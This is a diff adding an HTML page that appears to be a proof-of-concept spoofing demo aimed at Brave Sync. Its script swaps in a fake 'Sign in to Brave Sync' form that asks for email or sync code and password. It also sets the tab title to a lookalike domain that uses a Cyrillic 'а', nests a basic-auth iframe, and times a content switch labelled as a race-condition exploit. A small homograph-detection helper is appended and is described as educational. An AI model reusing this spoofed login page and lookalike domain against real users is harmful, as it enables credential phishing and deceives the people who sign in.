@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Brave Sync</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 16px;
+    }
+
+    button {
+      font-size: 24px;
+      padding: 16px 32px;
+      border: none;
+      background-color: #007bff;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+      margin: 10px 0;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(0, 107, 255, 0.3);
+    }
+
+    button:hover {
+      background-color: #0056b3;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(0, 107, 255, 0.4);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    #container {
+      margin-top: 30px;
+      animation: fadeIn 0.3s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .login-container {
+      max-width: 400px;
+      margin: 100px auto;
+      background-color: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+      text-align: center;
+      animation: slideUp 0.4s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .login-container img {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 20px;
+      display: block;
+    }
+
+    .login-container h2 {
+      margin-bottom: 24px;
+      color: #1a1a1a;
+      font-size: 1.5rem;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+    }
+
+    .login-container input {
+      width: 100%;
+      padding: 12px 14px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: 1px solid #d0d0d0;
+      border-radius: 6px;
+      transition: all 0.2s ease;
+      font-family: inherit;
+    }
+
+    .login-container input:focus {
+      outline: none;
+      border-color: #ff7139;
+      box-shadow: 0 0 0 3px rgba(255, 113, 57, 0.1);
+    }
+
+    .login-container input::placeholder {
+      color: #999;
+    }
+
+    .login-container button {
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 16px;
+      background-color: #ff7139;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+      margin-top: 8px;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(255, 113, 57, 0.3);
+    }
+
+    .login-container button:hover {
+      background-color: #e55a1f;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(255, 113, 57, 0.4);
+    }
+
+    .login-container button:active {
+      transform: translateY(0);
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 12px;
+      }
+
+      button {
+        font-size: 18px;
+        padding: 14px 24px;
+      }
+
+      .login-container {
+        padding: 32px 20px;
+        margin: 50px auto;
+      }
+
+      .login-container h2 {
+        font-size: 1.3rem;
+      }
+
+      .login-container input,
+      .login-container button {
+        font-size: 16px;
+        padding: 11px 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <button id="loadBtn">Click me</button>
+  <div id="container"></div>
+
+  <script>
+    (function() {
+      'use strict';
+
+      const DELAYS = {
+        iframeLoad: 3000,
+        buttonShow: 1000,
+        raceCondition: 500,
+        contentSwitch: 200,
+        fadeIn: 300,
+        titleChange: 500
+      };
+
+      const LOGO_URL = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQoRUg0l7PMuv1byhqZ90_i41rtCfjKYpjFeA&s';
+      const FALLBACK_LOGO = 'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2260%22 height=%2260%22%3E%3Crect fill=%22%23ff7139%22 width=%2260%22 height=%2260%22 rx=%228%22/%3E%3Ctext x=%2230%22 y=%2240%22 font-size=%2232%22 fill=%22white%22 text-anchor=%22middle%22 font-weight=%22bold%22%3E✓%3C/text%3E%3C/svg%3E';
+
+      // IDN Homograph domains
+      const DOMAINS = {
+        legitimate: 'brave.com',
+        spoofed: 'brаve.com',      // Cyrillic 'а' (U+0430)
+        punycode: 'xn--brve-1oc.com'
+      };
+
+      const loadBtn = document.getElementById('loadBtn');
+      const container = document.getElementById('container');
+
+      let raceConditionActive = false;
+      let timingStartTime = 0;
+
+      /**
+       * Update document title to simulate domain change
+       * Note: The actual browser address bar cannot be changed by JavaScript
+       * for security reasons, but the document title can be updated
+       */
+      function updatePageTitle(domain) {
+        document.title = domain;
+        
+        // Also update favicon title (browser tab)
+        const favicon = document.querySelector("link[rel='icon']");
+        if (favicon) {
+          favicon.href = FALLBACK_LOGO;
+        }
+      }
+
+      function createLoginForm() {
+        const form = document.createElement('div');
+        form.className = 'login-container';
+        form.innerHTML = `
+          <img src="${LOGO_URL}" alt="Logo" onerror="this.src='${FALLBACK_LOGO}'">
+          <h2>Sign in to Brave Sync</h2>
+          <input type="text" placeholder="Email or Sync Code" aria-label="Email or Sync Code">
+          <input type="password" placeholder="Password" aria-label="Password">
+          <button type="button">Sign In</button>
+        `;
+        return form;
+      }
+
+      function createIframe() {
+        const iframe = document.createElement('iframe');
+        iframe.srcdoc = '<iframe src="https://httpbin.org/basic-auth/user/passwd"></iframe>';
+        iframe.style.width = '100%';
+        iframe.style.height = '300px';
+        iframe.style.border = 'none';
+        iframe.style.borderRadius = '8px';
+        return iframe;
+      }
+
+      function exploitRaceCondition() {
+        raceConditionActive = true;
+        timingStartTime = performance.now();
+
+        const raceInterval = setInterval(() => {
+          const elapsed = performance.now() - timingStartTime;
+          
+          if (elapsed > DELAYS.raceCondition) {
+            clearInterval(raceInterval);
+            raceConditionActive = false;
+          }
+        }, 50);
+
+        setTimeout(() => {
+          if (raceConditionActive) {
+            injectSpoofedContent();
+          }
+        }, DELAYS.contentSwitch);
+      }
+
+      function injectSpoofedContent() {
+        const loginForm = createLoginForm();
+        container.innerHTML = '';
+        container.appendChild(loginForm);
+        
+        // Update title to spoofed domain
+        setTimeout(() => {
+          updatePageTitle(DOMAINS.spoofed);
+        }, DELAYS.titleChange);
+      }
+
+      function handleLoadClick() {
+        container.innerHTML = '';
+        updatePageTitle('Brave Sync');
+
+        setTimeout(() => {
+          const iframe = createIframe();
+          container.appendChild(iframe);
+
+          setTimeout(() => {
+            const pwnBtn = document.createElement('button');
+            pwnBtn.id = 'triggerBtn';
+            pwnBtn.textContent = 'Click me';
+            pwnBtn.style.fontSize = '24px';
+            pwnBtn.style.padding = '16px 32px';
+            document.body.appendChild(pwnBtn);
+
+            pwnBtn.addEventListener('click', handleTriggerClick);
+          }, DELAYS.buttonShow);
+
+          setTimeout(() => {
+            exploitRaceCondition();
+          }, DELAYS.buttonShow + 500);
+        }, DELAYS.iframeLoad);
+      }
+
+      function handleTriggerClick() {
+        const loginForm = createLoginForm();
+        document.body.innerHTML = '';
+        document.body.appendChild(loginForm);
+        
+        // Update title to spoofed domain
+        updatePageTitle(DOMAINS.spoofed);
+      }
+
+      loadBtn.addEventListener('click', handleLoadClick);
+
+      /**
+       * Security Analysis API (for educational purposes)
+       * Demonstrates how to detect and analyze IDN homograph attacks
+       */
+      window.SECURITY_ANALYSIS = {
+        /**
+         * Check if a domain is an IDN domain
+         */
+        isIDNDomain: function(domain) {
+          return /[^\x00-\x7F]/.test(domain);
+        },
+
+        /**
+         * Convert IDN domain to Punycode
+         */
+        toPunycode: function(domain) {
+          try {
+            return new URL(`https://${domain}`).hostname;
+          } catch (error) {
+            return null;
+          }
+        },
+
+        /**
+         * Detect potential homograph attacks
+         */
+        detectHomograph: function(domain) {
+          const cyrillicMap = {
+            'а': 'a', 'е': 'e', 'о': 'o', 'р': 'p', 'с': 'c',
+            'х': 'x', 'у': 'y', 'н': 'n', 'м': 'm', 'в': 'v'
+          };
+
+          let latinized = domain.toLowerCase();
+          for (const [cyrillic, latin] of Object.entries(cyrillicMap)) {
+            latinized = latinized.replace(new RegExp(cyrillic, 'g'), latin);
+          }
+
+          return {
+            original: domain,
+            latinized: latinized,
+            isHomograph: latinized !== domain.toLowerCase()
+          };
+        },
+
+        /**
+         * Get current page information
+         */
+        getCurrentPageInfo: function() {
+          return {
+            title: document.title,
+            url: window.location.href,
+            origin: window.location.origin,
+            hostname: window.location.hostname
+          };
+        },
+
+        /**
+         * Browser security limitations
+         */
+        getSecurityLimitations: function() {
+          return {
+            canChangeTitle: true,
+            canChangeAddressBar: false,
+            reason: 'Modern browsers prevent JavaScript from changing the address bar for security reasons to prevent phishing attacks'
+          };
+        }
+      };
+
+      // Log security information to console for analysis
+      console.log('Security Analysis Available: window.SECURITY_ANALYSIS');
+      console.log('Current Page Info:', window.SECURITY_ANALYSIS.getCurrentPageInfo());
+      console.log('Browser Limitations:', window.SECURITY_ANALYSIS.getSecurityLimitations());
+    })();
+  </script>
+</body>
+</html>
